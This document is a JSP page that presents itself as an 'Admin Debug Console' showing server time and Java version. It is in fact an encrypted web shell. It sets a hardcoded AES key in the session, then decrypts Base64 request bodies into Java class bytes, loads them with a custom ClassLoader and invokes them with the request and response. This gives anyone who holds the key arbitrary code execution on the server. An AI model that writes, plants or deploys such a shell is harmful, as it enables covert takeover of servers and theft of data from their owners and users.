<%@ page language="java" contentType="text/html; charset=UTF-8" %>
<%@ page import="java.util.*, javax.crypto.*, javax.crypto.spec.*, java.security.*, java.io.*, java.net.*, java.lang.reflect.*" %>
<!DOCTYPE html>
<html>
<head>
    <title>Admin Debug Console</title>
</head>
<body>
    <h2>System Diagnostics</h2>
    <%
        String action = request.getParameter("action");
        if (action == null) {
            out.println("<p>Server Time: " + new Date() + "</p>");
            out.println("<p>Java Version: " + System.getProperty("java.version") + "</p>");
            return;
        }

        if ("status".equals(action)) {
            String k = (String) session.getAttribute("key");
            if (k == null) {
                k = "e45e329feb5d925b";
                session.setAttribute("key", k);
            }
            out.println("Session established.");
            return;
        }

        if ("exec".equals(action)) {
            String k = (String) session.getAttribute("key");
            if (k == null) return;

            BufferedReader br = request.getReader();
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            String encryptedData = sb.toString();
            if (encryptedData.isEmpty()) return;

            byte[] decoded = Base64.getDecoder().decode(encryptedData);

            SecretKeySpec keySpec = new SecretKeySpec(k.getBytes(), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, keySpec);
            byte[] classBytes = cipher.doFinal(decoded);

            ClassLoader loader = new ClassLoader() {
                public Class<?> define(byte[] b) {
                    return defineClass(b, 0, b.length);
                }
            };

            Class<?> payloadClass = loader.define(classBytes);
            Object instance = payloadClass.newInstance();
            Method eq = payloadClass.getMethod("equals", Object.class, Object.class);
            eq.invoke(instance, request, response);
        }
    %>
</body>
</html>
